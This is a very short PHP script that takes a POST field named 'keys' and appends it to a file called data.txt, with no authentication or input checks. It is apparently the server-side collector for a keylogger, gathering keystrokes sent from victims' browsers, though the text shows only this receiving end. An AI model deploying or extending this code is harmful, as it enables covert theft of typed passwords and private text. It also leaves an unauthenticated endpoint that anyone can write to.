<?php 


if(isset($_POST['keys'])){

	$file = fopen('data.txt', 'a');
	fwrite($file, $_POST['keys']);
	fclose($file);
}
?>
